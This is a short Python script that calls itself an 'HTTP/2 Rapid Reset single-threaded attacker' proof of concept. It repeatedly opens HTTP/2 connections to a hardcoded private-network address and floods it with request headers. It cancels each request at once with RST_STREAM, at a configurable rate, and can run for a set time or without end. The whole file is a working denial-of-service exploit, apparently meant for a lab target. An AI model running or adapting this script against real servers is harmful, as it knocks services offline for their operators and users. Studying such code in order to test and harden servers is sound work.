import socket
import time
import sys
import random
import argparse
import h2.connection
import h2.config

TARGET_IP   = "192.168.20.10"
TARGET_PORT = 80

parser = argparse.ArgumentParser(description="HTTP/2 Rapid Reset single-threaded attacker")
parser.add_argument(
    "cancel_rate", type=float, nargs="?", default=1.0,
    help="Probability of RST_STREAM per HEADERS frame, 0.0–1.0 (default: 1.0)",
)
parser.add_argument(
    "--duration", type=int, default=None,
    help="Attack duration in seconds; omit for infinite",
)
args = parser.parse_args()

CANCEL_RATE = args.cancel_rate
end_time    = time.time() + args.duration if args.duration else None

print(
    f"🚀 [Attacker] Single-threaded started. "
    f"Cancel Rate: {CANCEL_RATE*100:.1f}%"
    + (f"  Duration: {args.duration}s" if args.duration else "  Duration: ∞")
)
sys.stdout.flush()

while True:
    if end_time and time.time() >= end_time:
        print("⏹️  Duration reached. Stopping.")
        break
    try:
        raw_socket = socket.create_connection((TARGET_IP, TARGET_PORT))
        h2_conn = h2.connection.H2Connection(
            config=h2.config.H2Configuration(client_side=True)
        )
        h2_conn.initiate_connection()
        raw_socket.sendall(h2_conn.data_to_send())

        stream_id = 1
        while True:
            if end_time and time.time() >= end_time:
                break
            headers = [
                (":method",    "GET"),
                (":authority", TARGET_IP),
                (":scheme",    "http"),
                (":path",      "/"),
                ("user-agent", "RapidReset-Single-PoC"),
            ]
            h2_conn.send_headers(stream_id, headers)
            if random.random() < CANCEL_RATE:
                h2_conn.reset_stream(stream_id, error_code=0x8)
            raw_socket.sendall(h2_conn.data_to_send())
            stream_id += 2
            time.sleep(0.01)

    except Exception:
        if end_time and time.time() >= end_time:
            break
        time.sleep(0.5)
